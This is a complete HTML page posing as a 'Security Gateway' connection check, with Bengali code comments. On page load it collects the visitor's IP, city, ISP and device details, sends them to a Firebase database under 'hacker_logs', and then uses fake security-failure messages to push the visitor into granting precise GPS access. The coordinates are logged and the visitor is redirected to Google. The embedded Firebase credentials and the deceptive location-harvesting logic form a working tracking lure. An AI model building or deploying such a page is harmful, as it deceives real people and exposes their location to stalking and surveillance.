<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Gateway</title>
    
    <!-- UAParser -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ১. প্রাথমিক ডাটা পাঠানো (যাতে অন্তত আইপিটা মিস না হয়)
        window.initLog = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data,
                latitude: "Tracing...", // শুরুতে এটা দেখাবে
                longitude: "Tracing...",
                actionStatus: "Target detected, forcing GPS..." 
            }).then(() => {
                // সেশন কি (Key) সেভ রাখা, যাতে পরে লোকেশন দিয়ে আপডেট করা যায়
                sessionStorage.setItem('logKey', newLogRef.key);
                // এবার লোকেশন শিকারে নামো
                window.forceLocation();
            });
        };

        // ২. লোকেশন পেলে ডাটাবেস আপডেট করা
        window.updateWithGPS = function(lat, lng) {
            const key = sessionStorage.getItem('logKey');
            if (key) {
                const updateRef = ref(db, 'hacker_logs/' + key);
                update(updateRef, {
                    latitude: lat,
                    longitude: lng,
                    actionStatus: "✅ GPS Locked Successfully!"
                }).then(() => {
                    // কাজ শেষ হলে গুগলে পাঠিয়ে দাও
                    window.location.href = "https://www.google.com";
                });
            }
        };
    </script>

    <style>
        body {
            background-color: #0f0f1a;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            height: 100vh; margin: 0; text-align: center;
        }
        .loader {
            border: 5px solid #1a1a2e;
            border-top: 5px solid #e94560;
            border-radius: 50%;
            width: 50px; height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        h2 { margin: 0; font-size: 18px; color: #e94560; }
        p { font-size: 12px; color: #a0a0b0; max-width: 300px; line-height: 1.5; }
        
        .retry-btn {
            background: #e94560; color: white; border: none;
            padding: 10px 20px; border-radius: 5px; font-weight: bold;
            margin-top: 20px; cursor: pointer; display: none;
        }
    </style>
</head>
<body>

    <div class="loader" id="spinner"></div>
    <h2 id="statusTitle">SYSTEM SCANNING...</h2>
    <p id="statusMsg">Checking secure connection. Do not close window.</p>
    
    <button class="retry-btn" id="retryBtn" onclick="window.forceLocation()">FIX CONNECTION</button>

    <script>
        let ipInfo = {};

        // পেজ লোড হলেই কাজ শুরু
        window.onload = function() {
            // আইপি এবং ডিভাইস ইনফো আগে নিয়ে নিই
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    ipInfo = data;
                    prepareInitialData();
                })
                .catch(() => {
                    ipInfo = { ip: "Unknown", city: "Unknown" };
                    prepareInitialData();
                });
        };

        function prepareInitialData() {
            var parser = new UAParser();
            var result = parser.getResult();
            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");

            let initialPayload = {
                ip: ipInfo.ip || "Tracing...",
                city: ipInfo.city || "Tracing...",
                isp: ipInfo.org || "Tracing...",
                deviceModel: deviceName,
                os: result.os.name,
                browser: result.browser.name,
                latitude: "Wait...",
                longitude: "Wait..."
            };

            // Firebase এ প্রথম ধাক্কা (আইপি সহ)
            if(window.initLog) window.initLog(initialPayload);
        }

        // ৩. কঠোর লোকেশন লজিক (The Loop)
        window.forceLocation = function() {
            document.getElementById('retryBtn').style.display = 'none';
            document.getElementById('statusTitle').innerText = "VERIFYING LOCATION...";
            document.getElementById('statusMsg').innerText = "Please allow location access to continue.";
            document.getElementById('spinner').style.display = 'block';

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    // Success (লোকেশন পাওয়া গেছে!)
                    function(position) {
                        document.getElementById('statusTitle').innerText = "ACCESS GRANTED";
                        document.getElementById('statusTitle').style.color = "#00b894";
                        
                        // ফায়ারভেজে আপডেট পাঠাও
                        if(window.updateWithGPS) {
                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                        }
                    },
                    // Error (সে ব্লক করেছে বা জিপিএস অফ)
                    function(error) {
                        console.log("GPS Failed: " + error.message);
                        handleError(error);
                    },
                    // Options (High Accuracy - আসল লোকেশনের জন্য)
                    {
                        enableHighAccuracy: true,
                        timeout: 10000, // ১০ সেকেন্ড চেষ্টা করবে
                        maximumAge: 0
                    }
                );
            } else {
                alert("GPS not supported on this device.");
            }
        };

        function handleError(error) {
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('statusTitle').innerText = "CONNECTION FAILED";
            
            if (error.code === error.PERMISSION_DENIED) {
                // যদি ইউজার 'Block' দেয়
                document.getElementById('statusMsg').innerText = "⚠ Security Check Failed! You MUST allow location permission to verify connection.";
            } else if (error.code === error.POSITION_UNAVAILABLE) {
                // যদি লোকেশন অফ থাকে
                document.getElementById('statusMsg').innerText = "⚠ GPS is OFF. Please turn on your device location.";
            } else {
                document.getElementById('statusMsg').innerText = "Network timeout. Please retry.";
            }

            // বাটন দেখিয়ে তাকে আবার গুঁতা দেওয়া
            document.getElementById('retryBtn').style.display = 'inline-block';
        }
    </script>
</body>
</html>
